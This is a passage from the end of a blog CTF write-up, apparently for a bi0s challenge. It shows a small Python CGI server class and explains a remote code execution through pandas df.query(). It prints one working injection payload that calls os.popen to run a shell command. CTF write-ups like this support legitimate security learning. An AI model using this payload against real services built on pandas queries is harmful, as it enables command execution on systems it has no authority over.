+<span class="line"><span style="color:var(--astro-code-token-keyword)">    def</span><span style="color:var(--astro-code-token-function)"> __init__</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-parameter)">self</span><span style="color:var(--astro-code-foreground)">):</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">response_headers </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-punctuation)"> {}</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">response_body </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> ""</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">post_body </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> ""</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">request_method </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">get_var</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"REQUEST_METHOD"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">content_length </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 0</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">            </span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    def</span><span style="color:var(--astro-code-token-function)"> get_params</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-parameter)">self</span><span style="color:var(--astro-code-foreground)">):</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        request_uri </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">get_var</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"REQUEST_URI"</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-keyword)"> if</span><span style="color:var(--astro-code-foreground)">  self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">get_var</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"REQUEST_URI"</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-keyword)"> else</span><span style="color:var(--astro-code-token-string-expression)"> ""</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        params_dict </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-punctuation)"> {}</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-token-string-expression)"> "?"</span><span style="color:var(--astro-code-token-keyword)"> in</span><span style="color:var(--astro-code-foreground)"> request_uri</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">            params </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> request_uri</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"?"</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-foreground)">]</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">            if</span><span style="color:var(--astro-code-token-string-expression)"> "&#x26;"</span><span style="color:var(--astro-code-token-keyword)"> in</span><span style="color:var(--astro-code-foreground)"> params</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">                params </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> params</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"&#x26;"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                for</span><span style="color:var(--astro-code-foreground)"> param </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-foreground)"> params</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">                    params_dict</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-foreground)">param</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"="</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">]</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> =</span><span style="color:var(--astro-code-foreground)"> param</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"="</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-foreground)">]</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">            else</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">                params_dict</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-foreground)">params</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"="</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">]</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> =</span><span style="color:var(--astro-code-foreground)"> params</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"="</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-foreground)">]</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-foreground)"> params_dict</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    def</span><span style="color:var(--astro-code-token-function)"> get_var</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-parameter)">self</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> variable</span><span style="color:var(--astro-code-foreground)">):</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-foreground)"> environ</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">get</span><span style="color:var(--astro-code-token-punctuation)">(variable)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    def</span><span style="color:var(--astro-code-token-function)"> set_header</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-parameter)">self</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> header</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> value</span><span style="color:var(--astro-code-foreground)">):</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">response_headers</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-foreground)">header</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> =</span><span style="color:var(--astro-code-foreground)"> value</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    def</span><span style="color:var(--astro-code-token-function)"> add_body</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-parameter)">self</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> value</span><span style="color:var(--astro-code-foreground)">):</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">response_body </span><span style="color:var(--astro-code-token-keyword)">+=</span><span style="color:var(--astro-code-foreground)"> value</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    def</span><span style="color:var(--astro-code-token-function)"> send_file</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-parameter)">self</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> filename</span><span style="color:var(--astro-code-foreground)">):</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">response_body </span><span style="color:var(--astro-code-token-keyword)">+=</span><span style="color:var(--astro-code-token-function)"> open</span><span style="color:var(--astro-code-token-punctuation)">(filename, </span><span style="color:var(--astro-code-token-string-expression)">"r"</span><span style="color:var(--astro-code-token-punctuation)">).</span><span style="color:var(--astro-code-token-function)">read</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    def</span><span style="color:var(--astro-code-token-function)"> send_response</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-parameter)">self</span><span style="color:var(--astro-code-foreground)">):</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        for</span><span style="color:var(--astro-code-foreground)"> header </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-foreground)"> self</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-foreground)">response_headers</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">            print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">f</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">header</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">: </span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">self.response_headers[header]</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-punctuation)">\n</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"\n"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(self.response_body)</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"\n"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span></code></pre>
+<p>At first i was thinking there might a vulnerability in the way the server handles parameters or something.. but perhaps we can get rce in the search_currency.py somehow?</p>
+<p>I tried for a bit but without success until while i was asleep one of our teammates figured out a way to get rce inside <code>df.query()</code> from the pandas library.</p>
+<h3 id="exploit">Exploit</h3>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1087" height="611" src="/_astro/pycgi2.BxdsrvQs_Z2YWk3.webp" ></p>
+<p>So turns out we can call and import variables inside the df.query() with <code>@</code></p>
+<p>After the CTF ended, someone published their solution which was way more elegant using the os library from pandas itself!</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>a'+(@pd.io.common.os.popen('ls > /tmp/ls').read())+'</span></span></code></pre>
+<p>Overall great challenge, learned alot from it, it took longer than it should but it was rewarding.</p>
+<p>Thanks to bi0s for the great CTF hoping to play next year !</p> <div class="mt-24"> <div class="grid grid-cols-2 gap-1.5 sm:gap-3"> <a href="/blog/04-twigplayground" class="group relative flex flex-nowrap rounded-lg border border-black/15 px-4 py-3 pl-10 no-underline transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-5 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-3 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="flex items-center text-sm">TwigPlayground - CSCTF 2024</div> </a> <a href="/blog/02-sparkctf-2022---writeup" class="group relative flex grow flex-row-reverse flex-nowrap rounded-lg border border-black/15 px-4 py-4 pr-10 no-underline transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute right-2 top-1/2 size-5 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-3 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 19 12 12 19" class="-translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="flex items-center text-sm">Teach me - SparkCTF Writeup</div> </a> </div> </div> <!-- Remove github comment feature --> <!--
+        <div class="mt-24">
+          <Giscus />
+        </div>
+      --> </article> </div>  </main> <footer class="animate"> <div class="mx-auto max-w-300 px-5"> <div class="relative"> <div class="absolute -top-12 right-0"> <script type="module">typeof window<"u"&&window.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("back-to-top");e&&e.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})})});</script> <button id="back-to-top" class="group relative flex w-fit flex-nowrap rounded-sm border border-black/15 py-1.5 pl-8 pr-3 transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 rotate-90 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm">Back to top</div> </button> </div> </div> <div class="flex items-center justify-between"> <div>&copy; 2026 • j3seer </div> <div class="flex flex-wrap items-center gap-1.5"> <button id="light-theme-button" aria-label="Light theme" class="group flex size-9 items-center justify-center rounded-sm border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black dark:group-hover:stroke-white dark:group-focus-visible:stroke-white"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <button id="dark-theme-button" aria-label="Dark theme" class="group flex size-9 items-center justify-center rounded-sm border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black dark:group-hover:stroke-white dark:group-focus-visible:stroke-white"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> </button> <button id="system-theme-button" aria-label="System theme" class="group flex size-9 items-center justify-center rounded-sm border border-black/15 hover:bg-black/5 focus-visible:bg-black/5 dark:border-white/20 dark:hover:bg-white/5 dark:focus-visible:bg-white/5"> <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="transition-colors duration-300 ease-in-out group-hover:animate-pulse group-hover:stroke-black group-focus-visible:animate-pulse group-focus-visible:stroke-black dark:group-hover:stroke-white dark:group-focus-visible:stroke-white"> <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect> <line x1="8" y1="21" x2="16" y2="21"></line> <line x1="12" y1="17" x2="12" y2="21"></line> </svg> </button> </div> </div> </div> </footer> <aside data-pagefind-ignore> <div id="backdrop" class="bg-[rgba(0, 0, 0, 0.5] invisible fixed left-0 top-0 z-50 flex h-screen w-full justify-center p-6 backdrop-blur-xs" data-astro-transition-persist="astro-3snakcvo-2"> <div id="pagefind-container" class="m-0 flex h-fit max-h-[80%] w-full max-w-(--breakpoint-sm) flex-col overflow-auto rounded-sm border border-black/15 bg-neutral-100 p-2 px-4 py-3 shadow-lg dark:border-white/20 dark:bg-neutral-900"> <div id="search" class="pagefind-ui pagefind-init" data-pagefind-ui data-bundle-path="/pagefind/" data-ui-options="{&#34;showImages&#34;:false,&#34;excerptLength&#34;:15,&#34;resetStyles&#34;:false}"></div> <script type="module" src="/_astro/Search.astro_astro_type_script_index_0_lang.DSe1Ey-Z.js"></script> <div class="mr-2 pb-1 pt-4 text-right text-xs dark:prose-invert">
+Press <span class="prose text-xs dark:prose-invert"><kbd class="">Esc</kbd></span> or click anywhere to close
+</div> </div> </div> </aside> <script>
+  const magnifyingGlass = document.getElementById("magnifying-glass");
+  const backdrop = document.getElementById("backdrop");
+
+  function openPagefind() {
+    const searchDiv = document.getElementById("search");
+    const search = searchDiv.querySelector("input");
+    setTimeout(() => {
+      search.focus();
+    }, 0);
+    backdrop?.classList.remove("invisible");
+    backdrop?.classList.add("visible");
+  }
+
+  function closePagefind() {
+    const search = document.getElementById("search");
+    search.value = "";
+    backdrop?.classList.remove("visible");
+    backdrop?.classList.add("invisible");
+  }
+
+  // open pagefind
+  magnifyingGlass?.addEventListener("click", () => {
+    openPagefind();
+  });
+
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "/") {
+      e.preventDefault();
+      openPagefind();
+    } else if ((e.metaKey || e.ctrlKey) && e.key === "k") {
+      e.preventDefault();
+      openPagefind();
+    }
+  });
+
+  // close pagefind
+  document.addEventListener("keydown", (e) => {
+    if (e.key === "Escape") {
+      closePagefind();
+    }
+  });
+
+  // close pagefind when searched result(link) clicked
+  document.addEventListener("click", (event) => {
+    if (event.target.classList.contains("pagefind-ui__result-link")) {
+      closePagefind();
+    }
+  });
+
+  backdrop?.addEventListener("click", (event) => {
+    if (!event.target.closest("#pagefind-container")) {
+      closePagefind();
+    }
+  });
+
+  // prevent form submission
+  const form = document.getElementById("form");
+  form?.addEventListener("submit", (event) => {
+    event.preventDefault();
+  });
+</script>  </body></html>
